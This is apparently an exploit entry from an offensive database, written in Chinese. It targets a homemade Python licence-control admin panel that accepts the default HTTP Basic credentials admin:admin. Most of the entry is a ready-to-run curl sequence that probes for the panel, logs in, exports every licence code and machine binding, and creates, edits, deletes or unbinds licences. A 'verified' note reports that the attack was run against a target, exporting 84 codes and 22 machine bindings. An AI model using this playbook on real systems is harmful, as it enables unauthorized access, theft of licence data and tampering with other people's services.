# 授权总控类面板默认口令 admin:admin（HTTP Basic）→ 全量授权码+机器绑定接管

- **code**: 授权总控类面板默认口令-admin-admin-http-basic-全量授权码-机器绑定接管
- **kind**: exp
- **category**: weak-password
- **component**: shouquan 授权总控（Python http.server 自制授权管理后台）
- **severity**: critical
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 靶标 beymfvyeq-ttaxcy-com / 203.0.113.1：example.com 用 admin:admin 返回 200（对照 admin:admin123 返回 403），导出 84 条授权码、22 台机器绑定（DESKTOP-2S9G4G4 / US1-20033D / TESTHOST / TESTPC / ubuntu）。4570 端口带同一 Host 头同样 200，证明三入口（80/443/4570）共用同一凭据。
- **tags**: basic-auth,默认口令,授权码,后台接管,python
- **created_at**: 2026-10-21T21:56:41.502Z
- **found_by**: exploit

## 描述

Python http.server 自制的「授权总控」授权码管理后台，使用 HTTP Basic 认证（前端 doLogin() 用 btoa("admin:"+normPw(pw)) 拼头，normPw 仅做全角转半角），默认口令 admin:admin。认证通过后可 GET /api/admin/stats、/api/admin/codes 全量导出授权码与机器绑定，POST /api/admin/{new,edit,del,unbind} 增删改解绑。前端为单页，标题「授权总控」，含 PH/BWT/PIN/500px 四应用。

## 用法

```
# 1) 识别：页面含 id=loginbox 与 doLogin()，AUTH="Basic "+btoa("admin:"+normPw(pw.value))，请求 /api/admin/stats
# 2) 认证探测（403 -> 200 即命中，务必做一组错误口令对照）
curl -s -o /dev/null -w "%{http_code}\n" -u "admin:admin"     -H "Host: TARGET_VHOST" http://TARGET/
curl -s -o /dev/null -w "%{http_code}\n" -u "admin:admin1234" -H "Host: TARGET_VHOST" http://TARGET/
# 3) 全量导出
curl -s -u "admin:admin" -H "Host: TARGET_VHOST" http://TARGET/api/admin/stats
curl -s -u "admin:admin" -H "Host: TARGET_VHOST" http://TARGET/api/admin/codes -o codes.json
# 4) 同一后端可能多端口监听：换端口时务必带同一 Host 头（不带 Host 常返回 nginx 404）
curl -s -u "admin:admin" -H "Host: TARGET_VHOST" http://TARGET_IP:4570/api/admin/stats
# 5) 操作接口（注意：max/days 无上界校验，写入会污染统计，慎用）
#    POST /api/admin/new    {"app":"ph","max":"1","days":"30","note":"..."}
#    POST /api/admin/edit   {"code":"PH-XXXX","max":5} / {"code":"...","add_days":90}
#    POST /api/admin/del    {"code":"..."}   POST /api/admin/unbind {"code":"...","mid":"..."}
```
